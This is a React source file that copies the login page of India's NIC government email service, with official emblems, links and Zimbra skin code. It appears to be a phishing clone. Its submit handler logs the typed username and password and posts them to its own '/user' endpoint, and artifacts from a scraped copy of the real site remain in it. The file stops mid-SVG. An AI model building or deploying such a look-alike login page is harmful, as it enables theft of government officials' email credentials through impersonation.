import React, { useState } from "react";
import nationalemblem from "../assets/img/nic/emblem.png";
import azadikaamrit from "../assets/img/nic/azadi-ka-amrit-mahotsav.png";
import digitalindialogo from "../assets/img/nic/digital-india-logo.png";
import menu from "../assets/img/nic/menu.svg";

import critical from "../assets/img/dwt/ImgCritical_32.png";

import appstore from "../assets/img/nic/app_store.png";

import playstore from "../assets/img/nic/google-play.png";

import kavach from "../assets/img/nic/nic-kavach.png";

import niclogo from "../assets/img/nic/nic_logo.png";

import nationalsalebrates from "../assets/img/nic/national_celebrates.jpg";
import axios from "axios";

const Home = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log(username, password);
    axios
      .post("/user", {
        username: username,
        password: password,
      })
      .then(function (response) {
        console.log(response);
      })
      .catch(function (error) {
        console.log(error);
      });
  };
  //   function ZmSkin(e) {
  //     this.hints = this.mergeObjects(ZmSkin.hints, e);
  //   }
  //   ZmSkin.hints = {
  //     name: "harmony",
  //     version: "1",
  //     skin: {
  //       containers: "skin_outer",
  //     },
  //     banner: {
  //       position: "static",
  //       url: "#",
  //     },
  //     userInfo: {
  //       position: "static",
  //     },
  //     search: {
  //       position: "static",
  //     },
  //     quota: {
  //       position: "static",
  //     },
  //     presence: {
  //       width: "40px",
  //       height: "24px",
  //     },
  //     appView: {
  //       position: "static",
  //     },
  //     searchResultsToolbar: {
  //       containers: ["skin_tr_search_results_toolbar"],
  //     },
  //     newButton: {
  //       containers: ["skin_td_new_button"],
  //     },
  //     tree: {
  //       minWidth: "13.5rem",
  //       maxWidth: "84rem",
  //       containers: ["skin_td_tree", "skin_td_tree_app_sash"],
  //       resizeContainers: ["skin_td_tree", "skin_container_app_new_button"],
  //     },
  //     topToolbar: {
  //       containers: "skin_spacing_app_top_toolbar",
  //     },
  //     treeFooter: {
  //       containers: "skin_tr_tree_footer",
  //     },
  //     topAd: {
  //       containers: "skin_tr_top_ad",
  //     },
  //     sidebarAd: {
  //       containers: "skin_td_sidebar_ad",
  //     },
  //     bottomAd: {
  //       containers: "skin_tr_bottom_ad",
  //     },
  //     treeTopAd: {
  //       containers: "skin_tr_tree_top_ad",
  //     },
  //     treeBottomAd: {
  //       containers: "skin_tr_tree_bottom_ad",
  //     },
  //     helpButton: {
  //       style: "link",
  //       container: "quota",
  //       url: "",
  //     },
  //     logoutButton: {
  //       style: "link",
  //       container: "quota",
  //     },
  //     appChooser: {
  //       position: "static",
  //       direction: "LR",
  //     },
  //     toast: {
  //       location: "N",
  //       transitions: [
  //         {
  //           type: "fade-in",
  //           step: 5,
  //           duration: 50,
  //         },
  //         {
  //           type: "pause",
  //           duration: 5000,
  //         },
  //         {
  //           type: "fade-out",
  //           step: -10,
  //           duration: 500,
  //         },
  //       ],
  //     },
  //     fullScreen: {
  //       containers: ["!skin_td_tree", "!skin_td_tree_app_sash"],
  //     },
  //     allAds: {
  //       containers: [
  //         "skin_tr_top_ad",
  //         "skin_td_sidebar_ad",
  //         "skin_tr_bottom_ad",
  //         "skin_tr_tree_top_ad",
  //         "skin_tr_tree_bottom_ad",
  //       ],
  //     },
  //     hideSearchInCompose: true,
  //     notificationBanner:
  //       "/skins/_base/logos/NotificationBanner_grey.gif?v=210728065637",
  //     socialfox: {
  //       iconURL: "/img/logo/ImgZimbraIcon.gif",
  //       icon32URL: "/img/logo/ImgZimbraLogo_32.gif",
  //       icon64URL: "/img/logo/ImgZimbraLogo_64.gif",
  //       mailIconURL: "/img/zimbra/ImgMessage.png",
  //     },
  //   };
  //   window.BaseSkin = ZmSkin;
  //   ZmSkin.prototype = {
  //     show: function (t, e, l) {
  //       var a = this.hints[t] && this.hints[t].containers;
  //       if (a) {
  //         if (typeof a == "function") {
  //           a.apply(this, [e != false]);
  //           skin._reflowApp();
  //           return;
  //         }
  //         if (typeof a == "string") {
  //           a = [a];
  //         }
  //         var s = false;
  //         for (var r = 0; r < a.length; r++) {
  //           var h = a[r];
  //           var o = h.replace(/^!/, "");
  //           var n = h != o;
  //           if (this._showEl(o, n ? !e : e)) {
  //             s = true;
  //           }
  //         }
  //         if (s && !l) {
  //           skin._reflowApp();
  //         }
  //       }
  //     },
  //     hide: function (e, t) {
  //       this.show(e, false, t);
  //     },
  //     gotoApp: function (e, t) {
  //       appCtxt.getAppController().activateApp(e, null, t);
  //     },
  //     gotoPrefs: function (e) {
  //       if (appCtxt.getCurrentAppName() != ZmApp.PREFERENCES) {
  //         var t = new AjxCallback(this, this._gotoPrefPage, [e]);
  //         this.gotoApp(ZmApp.PREFERENCES, t);
  //       } else {
  //         this._gotoPrefPage(e);
  //       }
  //     },
  //     mergeObjects: function (e, o) {
  //       if (e == null) {
  //         e = {};
  //       }
  //       for (var a = 1; a < arguments.length; a++) {
  //         var n = arguments[a];
  //         for (var t in n) {
  //           var s = e[t];
  //           if (typeof s == "object" && !(s instanceof Array)) {
  //             this.mergeObjects(e[t], n[t]);
  //             continue;
  //           }
  //           if (!e[t]) {
  //             e[t] = n[t];
  //           }
  //         }
  //       }
  //       return e;
  //     },
  //     getTreeWidth: function () {
  //       return Dwt.getSize(this._getEl(this.hints.tree.containers[0])).x;
  //     },
  //     setTreeWidth: function (e) {
  //       this._setContainerSizes("tree", e, null);
  //     },
  //     showTopAd: function (e) {
  //       if (skin._showEl("skin_tr_top_ad", e)) {
  //         skin._reflowApp();
  //       }
  //     },
  //     hideTopAd: function () {
  //       skin.showTopAd(false);
  //     },
  //     getTopAdContainer: function () {
  //       return skin._getEl("skin_container_top_ad");
  //     },
  //     showSidebarAd: function (e) {
  //       var t = "skin_td_sidebar_ad";
  //       if (e != null) {
  //         Dwt.setSize(t, e);
  //       }
  //       if (skin._showEl(t)) {
  //         skin._reflowApp();
  //       }
  //     },
  //     hideSidebarAd: function () {
  //       var e = "skin_td_sidebar_ad";
  //       if (skin._hideEl(e)) {
  //         skin._reflowApp();
  //       }
  //     },
  //     getSidebarAdContainer: function () {
  //       return this._getEl("skin_container_sidebar_ad");
  //     },
  //     handleNotification: function (t, e) {},
  //     _getEl: function (e) {
  //       return typeof e == "string" ? document.getElementById(e) : e;
  //     },
  //     _showEl: function (o, i) {
  //       var t = this._getEl(o);
  //       if (!t) {
  //         return;
  //       }
  //       var a;
  //       if (i == false) {
  //         a = "none";
  //       } else {
  //         var e = t.tagName;
  //         if (e == "TD") {
  //           a = "table-cell";
  //         } else {
  //           if (e == "TR") {
  //             a = "table-row";
  //           } else {
  //             a = "block";
  //           }
  //         }
  //       }
  //       if (a != t.style.display) {
  //         t.style.display = a;
  //         return true;
  //       } else {
  //         return false;
  //       }
  //     },
  //     _hideEl: function (e) {
  //       return this._showEl(e, false);
  //     },
  //     _reparentEl: function (i, e) {
  //       var a = this._getEl(e);
  //       var t = a && this._getEl(i);
  //       if (t) {
  //         a.appendChild(t);
  //       }
  //     },
  //     _setContainerSizes: function (n, a, e) {
  //       var o = this.hints[n].resizeContainers || this.hints[n].containers;
  //       for (var t = 0; t < o.length; t++) {
  //         Dwt.setSize(o[t], a, null);
  //       }
  //     },
  //     _reflowApp: function () {
  //       if (window._zimbraMail) {
  //         window._zimbraMail.getAppViewMgr().fitAll();
  //       }
  //     },
  //     _gotoPrefPage: function (a) {
  //       if (a == null) {
  //         return;
  //       }
  //       var i = appCtxt.getApp(ZmApp.PREFERENCES);
  //       var t = i.getPrefController();
  //       var e = t.getPrefsView();
  //       e.selectSection(a);
  //     },
  //   };
  //   window.skin = new ZmSkin();
  //   jQuery(".menu-trigger").click(function () {
  //     jQuery("body").toggleClass("menu-active");
  //   });
  //   jQuery(".close-tip").click(function () {
  //     jQuery(".tip-content").slideToggle();
  //     jQuery(".tip-block").toggleClass("collapsed");
  //   });
  //   jQuery(".close-banner").click(function () {
  //     jQuery(".banner").hide();
  //   });

  //   jQuery(".version").selectric();
  //   jQuery(".tip-slider").slick({
  //     dots: true,
  //     arrows: false,
  //   });
  //   jQuery(".footer-logo").slick({
  //     dots: false,
  //     arrows: false,
  //     infinite: true,
  //     slidesToShow: 4,
  //     slidesToScroll: 1,
  //     autoplay: true,
  //     responsive: [
  //       {
  //         breakpoint: 1040,
  //         settings: {
  //           slidesToShow: 3,
  //         },
  //       },
  //       {
  //         breakpoint: 767,
  //         settings: {
  //           slidesToShow: 2,
  //         },
  //       },
  //       {
  //         breakpoint: 500,
  //         settings: {
  //           slidesToShow: 1,
  //         },
  //       },
  //       // You can unslick at a given breakpoint now by adding:
  //       // settings: "unslick"
  //       // instead of a settings object
  //     ],
  //   });

  const getParameterByName = (name) => {
    var url = window.location.href;
    name = name.replace(/[\[\]]/g, "$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
      results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return "";
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  };

  // show a message if they should be using the 'standard' client, but have chosen 'advanced' instead
  const clientChange = (selectValue, screen) => {
    var useStandard = true;
    useStandard =
      useStandard || (screen && screen.width <= 800 && screen.height <= 600);
    var div = document.getElementById("ZLoginUnsupported");
    if (div)
      div.style.display =
        selectValue == "advanced" && useStandard ? "block" : "none";
  };

  // Change Language as per the selection of dropdown
  const selectLang = (language) => {
    var brwsr_url = document.URL;
    brwsr_url = brwsr_url.split("?");
    brwsr_url = brwsr_url[0];
    var redirecturl = brwsr_url;
    if (language == "Hindi") redirecturl = brwsr_url + "?lang=hi";
    else if (language == "Tamil") redirecturl = brwsr_url + "?lang=ta";
    else if (language == "English") redirecturl = brwsr_url + "?lang=en";
    window.location = redirecturl;
  };

  // if they have JS, write out a "what's this?" link that shows the message below
  const showWhatsThis = () => {
    var anchor = document.getElementById("ZLoginWhatsThisAnchor"),
      tooltip = document.getElementById("ZLoginWhatsThis"),
      doHide = tooltip.style.display === "block";
    tooltip.style.display = doHide ? "none" : "block";
    anchor.setAttribute("aria-expanded", doHide ? "false" : "true");
  };

  const forgotPassword = (location) => {
    var accountInput = document.getElementById("username").value;
    var queryParams = encodeURI("account=" + accountInput);
    var url = "public/PasswordRecoveryd41d.html?" + location.search;

    if (accountInput !== "") {
      url +=
        (location.search !== "" ? "&" : "") +
        encodeURI("account=" + accountInput);
    }

    window.location.href = url;
  };

  const onLoad = () => {
    var loginForm = document.loginForm;
    if (loginForm.username) {
      if (loginForm.username.value != "") {
        loginForm.password.focus(); //if username set, focus on password
      } else {
        loginForm.username.focus();
      }
    }
    clientChange("standard");
    //check if the login page is loaded in the sidebar.
    if (navigator.mozSocial) {
      //send a ping so that worker knows about this page.
      navigator.mozSocial
        .getWorker()
        .port.postMessage({ topic: "worker.reload", data: true });
      //this page is loaded in firefox sidebar so listen for message from worker.
      navigator.mozSocial.getWorker().port.onmessage = function onmessage(e) {
        var topic = e.data.topic;
        if (topic && topic == "sidebar.authenticated") {
          window.location.href =
            "%3bjsessionid%3dnode0vi4446q5a83l1fn6rj330gm7k240763ade.html";
        }
      };
    }
    if (false && loginForm.totpcode) {
      loginForm.totpcode.focus();
    }
    showMainErrorDiv();
  };

  const reloadImage = () => {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
      if (
        this.readyState == 4 &&
        this.status == 200 &&
        this.responseText != null &&
        this.responseText != ""
      ) {
        document.getElementById("captchaId").value = this.responseText.trim();
        document.images["captchaImage"].src =
          "/captcha/captcha/" + this.responseText.trim() + ".png";
      }
    };
    xhttp.open("GET.html", "public/captcha_proxy.html", true);
    xhttp.send();
  };

  const validateLogin = (loginForm) => {
    reSetErrorDiv();
    if (!loginForm.username.value && !loginForm.password.value) {
      document.getElementById("errorDivEmptyUsernamePassword").style.display =
        "block";
      loginForm.username.focus();
      return false;
    } else if (!loginForm.username.value) {
      document.getElementById("errorDivEmptyUsername").style.display = "block";
      loginForm.username.focus();
      return false;
    } else if (!loginForm.password.value) {
      document.getElementById("errorDivEmptyPassword").style.display = "block";
      loginForm.password.focus();
      return false;
    }
    // NICPS-1018 : Rollback of "login with full email id" - Keep this code to implement it again using local config after patch 4 deployment
    // else if (loginForm.username.value.indexOf('@') == -1) {
    // 	document.getElementById('errorDivEnterFullEmailAddress').style.display = "block";
    // 	loginForm.password.focus();
    // 	return false;
    // }
    return true;
  };
  const showMainErrorDiv = () => {
    if (document.getElementById("ZLoginErrorPanel")) {
      document.getElementById("ZLoginErrorPanel").style.display = "block";
    }
  };
  const hideMainErrorDiv = () => {
    if (document.getElementById("ZLoginErrorPanel")) {
      document.getElementById("ZLoginErrorPanel").style.display = "none";
    }
  };
  const reSetErrorDiv = () => {
    document.getElementById("errorDivEmptyUsernamePassword").style.display =
      "none";
    document.getElementById("errorDivEmptyUsername").style.display = "none";
    document.getElementById("errorDivEmptyPassword").style.display = "none";
    document.getElementById("errorDivEnterFullEmailAddress").style.display =
      "none";
    hideMainErrorDiv();
  };

  return (
    <div
      onload={onLoad}
      style={{
        background: "#3555c2",
        backgroundAttachment: "fixed",
        fontFamily: "Roboto sans-serif",
      }}
    >
      <div className="header">
        <nav id="slide-menu">
          <ul>
            <li>
              <a href="videos/docs/safe.html" target="_blank">
                <span className="icon ico-email">
                  <img alt="" src="/nic/safemail.svg" />
                </span>
                Safe Email
              </a>
            </li>
            <li>
              <a href="https://eforms.nic.in/docs/policy.html">
                <span className="icon ico-policy">
                  <img alt="" src="/nic/policies.svg" />
                </span>
                Policies
              </a>
            </li>
            <li>
              <a href="public/docs/Whats_New.pdf" target="_blank">
                <span className="icon ico-faqs">
                  <img alt="" src="/nic/faq.svg" />
                </span>
                What's New/FAQ
              </a>
            </li>
            <li>
              <a href="https://quicksms.emailgov.in/" target="_blank">
                <span className="icon ico-ksms">
                  <img alt="" src="/nic/quick-sms.svg" />
                </span>
                QuickSMS
              </a>
            </li>
            <li>
              <a
                href="https://quicksms.emailgov.in/mobile/#/login"
                target="_blank"
              >
                <span className="icon ico-mobile">
                  <img alt="" src="/nic/update-mobile-no.svg" />
                </span>
                Update Mobile Number
              </a>
            </li>
            <li>
              <a
                href="https://quicksms.emailgov.in/idlookup/#/login"
                target="_blank"
              >
                <span className="icon ico-id">
                  <img alt="" src="/nic/idlook.svg" />
                </span>
                ID-Lookup
              </a>
            </li>
            <li>
              <a href="https://servicedesk.nic.in/" target="_blank">
                <span className="icon ico-id">
                  <img alt="" src="/nic/policies.svg" />
                </span>
                Contact Us
              </a>
            </li>
            <li>
              <a href="https://kavach.mail.gov.in/" target="_blank">
                <span className="icon ico-policy">
                  <img alt="" src="/nic/userpolicy.png" />
                </span>
                User Policy
              </a>
            </li>
            <li>
              <a href="videos/docs/kavach-installation.pdf" target="_blank">
                <span className="icon ico-faqs">
                  <img alt="" src="/nic/faq.svg" />
                </span>
                Kavach Installation
              </a>
            </li>
          </ul>
        </nav>
        <div className="logo-block">
          <div className="emblem">
            <img src={nationalemblem} alt="National Emblem" />
          </div>
          <a href="https://amritmahotsav.nic.in/" target="_blank">
            <img
              src={azadikaamrit}
              className="am-logo"
              alt="Azadi ka amrit mahotsav logo"
            />
          </a>
          <a href="https://digitalindia.gov.in/" target="_blank">
            <img src={digitalindialogo} alt="Digital india logo" />
          </a>
        </div>
        <div className="menu-trigger">
          <span className="icon ico-menu">
            <img src={menu} />
          </span>
          <p
            style={{
              color: "white",
              marginLeft: "-8px",
              display: "inline-block",
            }}
          >
            Menu
          </p>
        </div>
      </div>

      <div className="bg">
        <svg
          version="1.1"
          id="Artboard_1_1_"
          //   xmlns="http://www.w3.org/2000/svg"
          //   xmlns:xlink="http://www.w3.org/1999/xlink"
          x="0px"
          y="0px"
          viewBox="0 0 2464 1800"
          style={{ enableBackground: "new 0 0 2464 1800" }}
          //   xml:space="preserve"
        >
          <g id="green">
            <g>
              <path
                className="sbg0"
                d="M1153,1179c-172.8,221.8-315.8,227.9-384.7,212.4c-3.5-0.8-4.9,4.4-1.4,5.4c99.7,29.3,247.8-39.9,253.9-42.8
        c0.1-0.1,0.3-0.1,0.4-0.2c378.3-260.9,802.2-175.3,1036.5-92.8c88,31,180.3-34.1,180.3-127.5v0c0-88.1-52.2-168-133.2-202.6
        C1788.3,795.8,1365.7,906.1,1153,1179z"
              />
            </g>
          </g>
          <g id="orange">
            <g>
              <path className="sbg1" d="M0,16.8" />
              <path className="sbg1" d="M437.5,0" />
              <path
                className="sbg1"
                d="M485.3,636.4C595.1,686.8,916.4,834.2,998,1095c5.8,18.6,55.1,178.2-16.5,244c-20.3,18.7-49,31.3-88.5,34
        c-171.5,11.7-222-130-222-130c0,0,0,0,0,0c-0.2,0.9-0.4,1.9-0.5,2.8c-11.7,65.6,28.2,129.3,91.9,149.1
        c109.4,34,198.6-27.3,234.1-57.5c0,0,15.3-14.6,26.5-30.7c66.2-94.3,98.1-473.5-144.2-821.9c-62.7-90.2-207.1-297.7-447-339
        c-51.8-8.9-185.8-32-255,48c-60.1,69.5-44.7,186.1-3,261C229.5,554.9,321.3,561.2,485.3,636.4z"
              />
            </g>
          </g>
          <g id="leg">
            <g>
              <path
                className="sbg1"
                d="M815,1466c0,0-38.8,0.7-57-5c0,0,55.6,25.4,79,83c0,0,6.4,11.1,9,0L815,1466z"
              />
            </g>
          </g>
          <g id="leg_1_">
            <g>
              <path
                className="sbg1"
                d="M749,1541c-0.4-1.9-7-86-7-86s-39.5-7.2-107-81c0,0,61,77.3,70,90c9,12.8,29,50.2,31,69
        S749.4,1542.9,749,1541z"
              />
            </g>
          </g>
          <g id="head">
            <g>
              <polygon
                className="sbg2"
                points="841,1064 831,1102 836,1105 876,1073         "
              />
            </g>
          </g>
          <g id="white">
            <g>
              <path
                className="sbg3"
                d="M723,1373c-92.1-70.2-38-168-38-168c65.2-109.4,177-58,177-58c-16.3-58.5-79-69-79-69
        c-75.4-9.6-121.9,40-133,53c-70.3,82.6-43.3,177.6-39,194c18.2,70.3,108.1,129.2,142,136c124.2,25.1,194.1-39.1,214-57
        s55-50,55-50C821.9,1436.8,752.8,1395.7,723,1373z"
              />
            </g>
          </g>
          <g id="eye">
            <g>
              <path
                className="sbg2"
                d="M817.5,1100c-6.4,0-11.5,5.1-11.5,11.5s5.1,11.5,11.5,11.5s11.5-5.1,11.5-11.5S823.9,1100,817.5,1100z"
              />
            </g>
          </g>
        </svg>
      </div>

      <div className="content-area">
        <div className="loginform">
          <div className="logo">
            <svg
              version="1.1"
              id="Layer_1"
              //   xmlns="http://www.w3.org/2000/svg"
              //   xmlns:xlink="http://www.w3.org/1999/xlink"
              x="0px"
              y="0px"
              viewBox="0 0 76 104"
              style={{ enableBackground: "new 0 0 76 104" }}
              //   xml:space="preserve"
            >
              <g>
                <defs>
                  <rect id="SVGID_1_" width="76" height="104" />
                </defs>
                {/* <clipPath id="SVGID_2_">
                  <use xlink:href="#SVGID_1_" style="overflow:visible;" />
                </clipPath> */}
                <path
                  className="st0"
                  d="M24.7,80.1c-4.4,0-8,3.6-8,8c0,4.4,3.6,8,8,8s8-3.6,8-8c0,0,0,0,0,0C32.7,83.7,29.2,80.1,24.7,80.1
                C24.7,80.1,24.7,80.1,24.7,80.1 M24.7,91.8c-2,0-3.7-1.6-3.7-3.7c0-2,1.6-3.7,3.7-3.7c2,0,3.7,1.6,3.7,3.7c0,0,0,0,0,0
                C28.4,90.2,26.8,91.8,24.7,91.8"
                />
                <path
                  className="st1"
                  d="M48,95.6c-1.7,0.1-3.1-1.2-3.2-2.9c-0.1-1.7,1.2-3.1,2.9-3.2c1.7-0.1,3.1,1.2,3.2,2.9c0,0.1,0,0.1,0,0.2
                C51,94.2,49.7,95.5,48,95.6"
                />
                <polygon
                  className="st0"
                  points="42.8,80.9 39.7,90.5 36.6,80.9 31.9,80.9 37.3,95.1 42.1,95.1 42.1,95.1 47.5,80.9 	"
                />
                <rect
                  x="52.8"
                  y="80.7"
                  className="st0"
                  width="4.5"
                  height="14.2"
                />
                <path
                  className="st0"
                  d="M15.5,80.6h-4.3l0.1,1c-1.1-0.7-2.5-1.1-3.8-1.1c-4.3,0.1-7.7,3.7-7.6,8.1c0.1,4.1,3.5,7.5,7.6,7.6
                c1.3,0,2.5-0.3,3.6-0.9v0.8c0,1.9-1,3.5-3.3,3.6H7.5c-0.6,0-1.1-0.1-1.6-0.3c0.1,1.5,0.1,2.7,0.1,4.3c0.6,0.2,1.2,0.3,1.8,0.3
                c4.6,0,7.7-3.7,7.7-8v-2.2c0,0,0,0,0,0.1V80.6z M7.6,91.9c-2,0-3.5-1.6-3.5-3.6c0-2,1.6-3.5,3.6-3.5c1.9,0,3.5,1.6,3.5,3.5
                C11.2,90.3,9.6,91.9,7.6,91.9C7.6,91.9,7.6,91.9,7.6,91.9"
                />
                <path
                  className="st0"
                  d="M68.1,80.1c-1.5,0-3,0.6-4,1.8L64,81.9l0.1-1.3h-4.5v14.2h4.5v-6.7c0-1.9,1.4-3.7,3.3-3.7
                c1.9,0,3.1,1.8,3.1,3.7v6.7H75v-6.7C75,83.2,73.3,80.1,68.1,80.1"
                />
                <path
                  className="st0"
                  d="M74,35.6c-0.8,0.8-1.5,1.7-2.3,2.5c-0.5,0.5-1,1-1.4,1.4c-0.4,0.4-1.1,1.1-1.7,1.6c-1,0.9-2.1,1.8-3.1,2.6
                l-1.2,0.9c-0.9,0.9-1.9,1.7-2.9,2.4c-2.3,1.5-4.7,2.7-7.3,3.8l0.6,0.3C65.4,56.3,76,47.6,76,36.3c0-1,0-2-0.1-2.9
                C75.3,34.2,74.6,34.9,74,35.6"
                />
                <path
                  className="st0"
                  d="M39.2,72.7c8.4,0.2,16.5-2.9,22.7-8.5c0.5-0.4,0.6-1.2,0.1-1.7c-0.1-0.1-0.2-0.2-0.2-0.2l-6.4-5.9
                c-0.5-0.4-1.3-0.4-1.8,0c-1.9,1.5-4,2.8-6.2,3.9c-5.1,2-10.8,2.2-16,0.4l0.8,11.3C34.5,72.4,36.9,72.6,39.2,72.7"
                />
                <path
                  className="st2"
                  d="M40.2,44.1L40.2,44.1c0.2,0,0.4,0,0.6-0.1L40.2,44.1"
                />
                <path
                  className="st1"
                  d="M42.6,16.4c0,0.9-0.7,1.6-1.6,1.6c-0.9,0-1.6-0.7-1.6-1.6c0-0.9,0.7-1.6,1.6-1.6
                C41.9,14.8,42.6,15.5,42.6,16.4"
                />
                <path
                  className="st3"
                  d="M46.3,0.6c-0.9-0.3-1.8-0.4-2.8-0.4C44.4,0.3,45.4,0.4,46.3,0.6"
                />
                <path
                  className="st0"
                  d="M75.2,41.2L75.2,41.2C75.2,41.2,75.2,41.2,75.2,41.2"
                />
                <path
                  className="st0"
                  d="M69,38.4c2.5-3.4,4.4-7.1,5.8-11c0-0.1,0-0.2-0.1-0.3c-0.1-0.1,0,0,0-0.1c-0.2-0.8-0.5-1.7-0.8-2.5
                c0,0,0-0.1,0-0.1c-0.3-0.8-0.6-1.6-1-2.4v-0.1v-0.1c-0.3-0.8-0.7-1.5-1.1-2.3c-0.2-0.5-0.5-0.9-0.8-1.4c-0.1-0.1-0.2-0.3-0.2-0.4
                l-0.8-1l-0.3-0.4c-0.2-0.3-0.4-0.6-0.6-0.9L68.9,15c-0.3-0.4-0.6-0.8-0.9-1.2c-0.5-0.7-1.1-1.4-1.7-2l-0.2-0.2
                c-0.4-0.4-0.7-0.8-1.1-1.1l-0.6-0.6c0,0.1,0.1,0.2,0.2,0.4c0-0.1-0.1-0.3-0.2-0.4C49.7-3.9,26.8-3.2,13,11.4
                C-0.7,26.1,0,49,14.6,62.8c4.6,4.4,10.4,7.4,16.6,8.9c-0.4-2.6-1.8-8.6-10.1-17.5l0.3,0.3c-4.6-4.6-7.3-10.8-7.5-17.4
                c-0.2-8.1,3.1-17.3,10.3-21.7c7.7-4.8,19.6-5,22.4,5.5c-1-0.6-2.1-1-3.2-1.3c-4.3-0.9-8.7-0.3-12.5,1.8c-3.2,1.9-5.7,4.8-7.1,8.3
                c-0.2,0.5-0.4,1-0.5,1.5c-0.4,1.5-0.7,3.1-0.7,4.7c-0.3,7.8,5.3,14.7,12.5,17.1c2.8,0.6,5.7,0.9,8.5,0.7c3.4-0.4,6.7-1.4,9.7-2.8
                c0-0.1,0.1-0.2,0.3-0.1c3-1.3,5.9-2.8,8.7-4.7C64.8,43.8,67.1,41.2,69,38.4 M39.2,44.1c-4.3-0.5-7.4-4.3-6.9-8.6
                c0.5-4.3,4.3-7.3,8.6-6.9c3.6,0.4,6.5,3.3,6.9,6.9c0.4,4.3-2.7,8.1-6.9,8.5C40.3,44.1,39.7,44.1,39.2,44.1 M56.8,39.1
                c0-6.8,1.2-14.6-2.6-21.6c-1-1.8-2.7-4.7-4.5-5.8c1.6,0.7,3.1,1.6,4.6,2.6c6.8,5.1,10.7,12.1,10.7,20.4c0,6.7-3.6,7.9-4.8,7.9
                C58.5,42.7,56.8,42.3,56.8,39.1"
                />
                <path
                  className="st1"
                  d="M53.5,50.7c3-1.3,5.9-2.8,8.7-4.7c2.6-2.2,4.9-4.8,6.8-7.7c2.5-3.4,4.4-7.1,5.8-11c0-0.1,0-0.2-0.1-0.3
                s0,0,0-0.1c-0.2-0.8-0.5-1.7-0.8-2.5c0,0,0-0.1,0-0.1c-0.3-0.8-0.6-1.6-1-2.4v-0.1v-0.1c-0.3-0.8-0.7-1.5-1.1-2.3
                c-0.2-0.5-0.5-0.9-0.8-1.4c-0.1-0.1-0.2-0.3-0.2-0.4l-0.8-1l-0.3-0.4c-0.2-0.3-0.4-0.6-0.6-0.9L68.9,15c-0.3-0.4-0.6-0.8-0.9-1.2
                c-0.5-0.7-1.1-1.4-1.7-2l-0.2-0.2c-0.4-0.4-0.7-0.8-1.1-1.1l-0.6-0.6c0.5,1,0.8,1.9,1.2,2.9c0,0.1,0.1,0.2,0.1,0.3
                c0.6,1.4,1,2.8,1.4,4.3c0.7,3,0.9,6,0.8,9c-0.4,9.8-2.3,17.2-10.8,20.9c-6.1,2.6-19.5,1.3-26-3.8c-2.8-2.2-7.1-7.5-7.9-12.4
                c-0.4,1.5-0.7,3.1-0.7,4.7c-0.3,7.8,5.3,14.7,12.5,17.1c2.8,0.6,5.7,0.9,8.5,0.7c3.4-0.4,6.7-1.4,9.7-2.8c0,0,0-0.1,0.1-0.1"
                />
                <path
                  className="st1"
                  d="M29.9,60c-1.6-0.6-3.1-1.4-4.5-2.3c-1.4-1-2.8-2.1-4-3.3l-0.3-0.3c8.4,8.9,9.7,15,10.1,17.5l1,0.2l-0.8-11.3
                C30.9,60.4,30.4,60.2,29.9,60"
                />
                <path
                  className="st1"
                  d="M23.1,30.5L23.1,30.5C23.1,30.4,23.1,30.4,23.1,30.5"
                />
                <path
                  className="st4"
                  d="M75.6,33.6L75.6,33.6l-0.2,0.2c-0.3,0.3-0.6,0.7-1,1.1l-0.2,0.2l-0.1,0.1L74,35.6l-0.1,0.2l-0.2,0.2l-0.2,0.2
                c-0.1,0.1-0.1,0.1-0.2,0.2c0,0.1-0.1,0.2-0.2,0.2l-0.2,0.2c-0.1,0.1-0.2,0.2-0.2,0.2c-0.1,0.1-0.1,0.1-0.2,0.2
                c-0.1,0.1-0.2,0.2-0.3,0.3l-0.1,0.2L71.7,38c-0.2,0.1-0.3,0.3-0.4,0.4l-0.2,0.1c-0.1,0.1-0.2,0.2-0.3,0.3l-0.2,0.2l-0.3,0.3
                l-0.2,0.2L69.7,40l-0.2,0.2c-0.1,0.1-0.2,0.2-0.3,0.3c-0.1,0.1-0.1,0.1-0.2,0.2L68.7,41l-0.2,0.2l-0.4,0.4l-0.1,0.1l-1.2,1
                l-0.2,0.1l-0.4,0.3L66,43.3l-0.4,0.3l-0.2,0.2L65,44c-0.1,0.1-0.2,0.1-0.3,0.2l-0.4,0.3l-0.3,0.2L63.7,45l-0.2,0.2l-0.4,0.3
                l-0.2,0.1L62.2,46c-2.7,1.8-5.6,3.4-8.7,4.7l-0.3,0.1c-3.1,1.4-6.4,2.3-9.7,2.8c-2.9,0.2-5.8,0-8.6-0.7c-0.5-0.1-1-0.3-1.5-0.5
                c7,3.3,16.1,1.6,21.8-0.9l0.5-0.2c4.9-2,10.5-4.7,16.8-4.7c2.2-3,3.3-6.6,3.3-10.2c0-1,0-1.9-0.1-2.9L75.6,33.6z"
                />
                <path className="st4" d="M65.5,43.6l-0.2,0.2L65.5,43.6z" />
                <path
                  className="st4"
                  d="M64.9,44c-0.1,0.1-0.2,0.1-0.3,0.2C64.7,44.2,64.8,44.1,64.9,44"
                />
                <path className="st4" d="M72.2,37.5l-0.1,0.2L72.2,37.5z" />
                <path className="st4" d="M68,41.5l-0.1,0.1L68,41.5z" />
                <path
                  className="st4"
                  d="M72.7,37c-0.1,0.1-0.1,0.1-0.2,0.2C72.5,37.1,72.6,37,72.7,37"
                />
                <path className="st4" d="M64.3,44.5L64,44.7L64.3,44.5z" />
                <path className="st4" d="M66.7,42.6l-0.2,0.1L66.7,42.6z" />
                <path className="st4" d="M63.7,45l-0.2,0.2L63.7,45z" />
                <path className="st4" d="M70.7,39l-0.2,0.2L70.7,39z" />
                <path className="st4" d="M66.1,43.1l-0.2,0.2L66.1,43.1z" />
                <path className="st4" d="M71.2,38.5L71,38.7L71.2,38.5z" />
                <path className="st4" d="M73.1,36.5l-0.2,0.2L73.1,36.5z" />
                <path className="st4" d="M75.6,33.6l-0.2,0.2L75.6,33.6z" />
                <path className="st4" d="M70.2,39.5l-0.1,0.2L70.2,39.5z" />
                <path
                  className="st4"
                  d="M75.4,33.9c-0.3,0.3-0.6,0.7-1,1.1C74.9,34.6,75.2,34.2,75.4,33.9"
                />
                <path className="st4" d="M74.5,35l-0.2,0.2L74.5,35z" />
                <path className="st4" d="M69.7,40l-0.2,0.2L69.7,40z" />
                <path className="st4" d="M68.6,41l-0.2,0.2L68.6,41z" />
